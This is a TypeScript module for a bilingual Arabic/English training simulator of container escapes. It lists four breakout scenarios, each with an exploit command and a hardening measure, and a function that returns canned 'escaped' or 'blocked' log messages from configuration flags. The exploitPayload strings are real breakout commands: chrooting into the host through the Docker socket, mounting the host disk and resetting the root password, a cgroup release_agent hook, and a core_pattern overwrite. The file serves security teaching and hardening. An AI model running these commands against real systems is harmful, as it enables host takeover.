/**
 * OMEGA V14 — Container Escape & Breakout Simulation Engine
 * Models classic container breakouts and their definitive kernel/orchestration mitigations.
 */

export interface EscapeVectorScenario {
  id: string;
  nameAr: string;
  nameEn: string;
  category: 'HOST_SOCKET' | 'PRIVILEGED_MODE' | 'PROCFS_CORE_PATTERN' | 'CGROUP_RELEASE_AGENT' | 'CAP_SYS_ADMIN';
  descriptionAr: string;
  descriptionEn: string;
  exploitPayload: string;
  mitigationConfigAr: string;
  mitigationConfigEn: string;
}

export const ESCAPE_SCENARIOS: EscapeVectorScenario[] = [
  {
    id: 'docker_socket_mount',
    nameAr: 'اختراق المضيف عبر مقبس دكر الممرر (/var/run/docker.sock)',
    nameEn: 'Host Takeover via Mounted Docker Socket (/var/run/docker.sock)',
    category: 'HOST_SOCKET',
    descriptionAr: 'تمرير مقبس Docker Daemon إلى داخل الحاوية يمنحها صلاحيات Root كاملة على المضيف عبر إنشاء حاوية جديدة بتركيب قرص المضيف بالكامل.',
    descriptionEn: 'Mounting the Docker UNIX socket allows the container to issue API commands to spawn a privileged container mounting the host root filesystem / to /host.',
    exploitPayload: 'docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash',
    mitigationConfigAr: 'حظر تمرير /var/run/docker.sock نهائياً واستبدال ذلك بـ Kaniko أو Buildah في بناء الحاويات المعزولة.',
    mitigationConfigEn: 'Strictly prohibit mounting /var/run/docker.sock. Use unprivileged container builders like Kaniko or Buildah.',
  },
  {
    id: 'privileged_flag_abuse',
    nameAr: 'كسر العزل باستخدام وضع الحاوية المميزة (--privileged)',
    nameEn: 'Container Escape via Privileged Mode (--privileged / privileged: true)',
    category: 'PRIVILEGED_MODE',
    descriptionAr: 'وضع --privileged يعطل جميع مرشحات Seccomp ويمنح الحاوية كافة صلاحيات Linux Capabilities والوصول لأجهزة /dev/sda المادية.',
    descriptionEn: 'The --privileged flag disables all Seccomp and AppArmor profiles, bestows all capabilities, and exposes all /dev/ host block devices.',
    exploitPayload: 'mkdir /mnt/host && mount /dev/sda1 /mnt/host && echo "root:compromised" | chpasswd --root /mnt/host',
    mitigationConfigAr: 'تطبيق معايير Pod Security Standards (Restricted) ومنع privileged: true عبر Admission Controllers.',
    mitigationConfigEn: 'Enforce Pod Security Standards (Restricted profile) and reject privileged: true at admission time.',
  },
  {
    id: 'cgroup_release_agent',
    nameAr: 'الهروب عبر نص الاستدعاء التلقائي لمجموعات التحكم (cgroup release_agent)',
    nameEn: 'Container Breakout via Cgroup release_agent Exploitation',
    category: 'CGROUP_RELEASE_AGENT',
    descriptionAr: 'عند توفر CAP_SYS_ADMIN، يمكن إنشاء cgroup فرعي وضبط release_agent لتشغيل شفرة برمجية على نواة المضيف عند موت العملية.',
    descriptionEn: 'With CAP_SYS_ADMIN, an attacker mounts a cgroup v1 hierarchy, registers a custom release_agent script, and triggers its execution as host root.',
    exploitPayload: 'mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && echo "/cmd.sh" > /tmp/cgrp/release_agent',
    mitigationConfigAr: 'إسقاط CAP_SYS_ADMIN وتفعيل cgroups v2 المحدث ونظام ملفات للقراءة فقط readOnlyRootFilesystem: true.',
    mitigationConfigEn: 'Drop CAP_SYS_ADMIN, migrate to cgroups v2, and enforce readOnlyRootFilesystem: true.',
  },
  {
    id: 'procfs_core_pattern',
    nameAr: 'استغلال نمط تفريغ الذاكرة للنواة (/proc/sys/kernel/core_pattern)',
    nameEn: 'Host Escape via /proc/sys/kernel/core_pattern Overwrite',
    category: 'PROCFS_CORE_PATTERN',
    descriptionAr: 'إذا كان /proc مركباً مع صلاحية الكتابة، يمكن تغيير core_pattern ليوجه تفريغ أخطاء النواة لتنفيذ نص خبيث على نظام المضيف.',
    descriptionEn: 'Writable /proc mount allows overwriting the kernel core_pattern handler to pipe crash dumps into a reverse shell running on the host.',
    exploitPayload: 'echo "|$PWD/payload.sh" > /proc/sys/kernel/core_pattern && kill -SEGV $$',
    mitigationConfigAr: 'استخدام AppArmor الافتراضي لمنع الكتابة في /proc/sys/، وتفعيل MaskedPaths و ReadonlyPaths الافتراضية في OCI Runtime.',
    mitigationConfigEn: 'Ensure OCI standard masked and readonly paths are active, backed by AppArmor/SELinux profiles.',
  },
];

export function testEscapeVulnerability(params: {
  scenarioId: string;
  hasHostSockMounted: boolean;
  isPrivileged: boolean;
  hasCapSysAdmin: boolean;
  hasReadOnlyRootFs: boolean;
  isRootlessContainer: boolean;
  seccompEnabled: boolean;
}): {
  escaped: boolean;
  severity: 'CRITICAL' | 'SAFE';
  logOutputAr: string;
  logOutputEn: string;
  remediationStepAr: string;
  remediationStepEn: string;
} {
  const scenario = ESCAPE_SCENARIOS.find((s) => s.id === params.scenarioId) || ESCAPE_SCENARIOS[0];

  if (params.isRootlessContainer) {
    return {
      escaped: false,
      severity: 'SAFE',
      logOutputAr: `[إحباط الهروب]: الحاوية تعمل بوضع Rootless (مستخدم غير مميز على المضيف UID 10001). تم رفض العملية (EPERM / Operation not permitted).`,
      logOutputEn: `[Escape Blocked]: Container runs in Rootless mode (mapped to unprivileged host UID 10001). Host kernel rejected syscall with EPERM.`,
      remediationStepAr: 'وضع Rootless يعمل بكفاءة ويحمي الخادم من أي استغلال.',
      remediationStepEn: 'Rootless execution effectively prevents host privilege escalation.',
    };
  }

  if (scenario.id === 'docker_socket_mount') {
    if (params.hasHostSockMounted) {
      return {
        escaped: true,
        severity: 'CRITICAL',
        logOutputAr: `[نجاح الاختراق]: تم الاتصال بنجاح بـ /var/run/docker.sock وإنشاء حاوية بصلاحيات كاملة مع تركيب /host. المهاجم أصبح Root على خادم المضيف!`,
        logOutputEn: `[Breakout Successful]: Connected to /var/run/docker.sock and spawned privileged container mounting host root filesystem. Attacker obtained full host root!`,
        remediationStepAr: 'قم بإزالة volumeMounts الخاصة بمقبس docker.sock فوراً.',
        remediationStepEn: 'Remove docker.sock volume mount from container/pod manifest immediately.',
      };
    } else {
      return {
        escaped: false,
        severity: 'SAFE',
        logOutputAr: `[حماية مؤكدة]: لم يتم العثور على مقبس /var/run/docker.sock. فشلت محاولة الاتصال بـ Docker Daemon.`,
        logOutputEn: `[Protected]: /var/run/docker.sock not present. Daemon connection refused.`,
        remediationStepAr: 'المقبس غير مركب، المنظومة آمنة.',
        remediationStepEn: 'Docker socket unexposed; host protected.',
      };
    }
  }

  if (scenario.id === 'privileged_flag_abuse') {
    if (params.isPrivileged) {
      return {
        escaped: true,
        severity: 'CRITICAL',
        logOutputAr: `[نجاح الاختراق]: بفضل وضع privileged: true، تمكن المهاجم من تركيب قرص المضيف /dev/sda1 والتعديل المباشر على /etc/shadow!`,
        logOutputEn: `[Breakout Successful]: Due to privileged: true, attacker accessed /dev/sda1 and modified /etc/shadow directly on the host!`,
        remediationStepAr: 'عطل خيار privileged واضبط SecurityContext على allowPrivilegeEscalation: false.',
        remediationStepEn: 'Disable privileged mode and set allowPrivilegeEscalation: false in Pod SecurityContext.',
      };
    } else {
      return {
        escaped: false,
        severity: 'SAFE',
        logOutputAr: `[إحباط الهروب]: تم رفض الوصول إلى أجهزة الأقراص /dev/sda1 (EACCES / Permission denied). قيود cgroup devices و seccomp فعالة.`,
        logOutputEn: `[Escape Blocked]: Host block device access denied (EACCES). Seccomp filter and cgroup devices controller enforced.`,
        remediationStepAr: 'الوضع غير المميز يحمي خوادم الإنتاج.',
        remediationStepEn: 'Unprivileged container posture prevents raw block device tampering.',
      };
    }
  }

  if (scenario.id === 'cgroup_release_agent') {
    if (params.hasCapSysAdmin && !params.hasReadOnlyRootFs) {
      return {
        escaped: true,
        severity: 'CRITICAL',
        logOutputAr: `[نجاح الاختراق]: مكنت CAP_SYS_ADMIN من إعادة تركيب cgroup وحقن أمر في release_agent، وتم تنفيذ الشفرة كـ Root على المضيف!`,
        logOutputEn: `[Breakout Successful]: CAP_SYS_ADMIN allowed mounting cgroup and writing release_agent hook. Script executed with host root authority!`,
        remediationStepAr: 'أسقط CAP_SYS_ADMIN وفعل readOnlyRootFilesystem: true.',
        remediationStepEn: 'Drop CAP_SYS_ADMIN and enforce readOnlyRootFilesystem: true.',
      };
    } else {
      return {
        escaped: false,
        severity: 'SAFE',
        logOutputAr: `[إحباط الهروب]: فشل تركيب cgroup بسبب إسقاط CAP_SYS_ADMIN وتفعيل نظام ملفات القراءة فقط.`,
        logOutputEn: `[Escape Blocked]: Mounting cgroup hierarchy rejected because CAP_SYS_ADMIN is absent and root filesystem is read-only.`,
        remediationStepAr: 'إسقاط الصلاحيات ونظام الملفات المقروء فقط يحبطان هذه الثغرة.',
        remediationStepEn: 'Least-privilege capabilities and read-only rootfs successfully neutralize this vector.',
      };
    }
  }

  return {
    escaped: false,
    severity: 'SAFE',
    logOutputAr: '[حماية مؤكدة]: تم صد محاولة الهروب بنجاح.',
    logOutputEn: '[Protected]: Escape attempt neutralized by active security controls.',
    remediationStepAr: 'الضوابط الأمنية فعالة.',
    remediationStepEn: 'Controls operating within safety baseline.',
  };
}
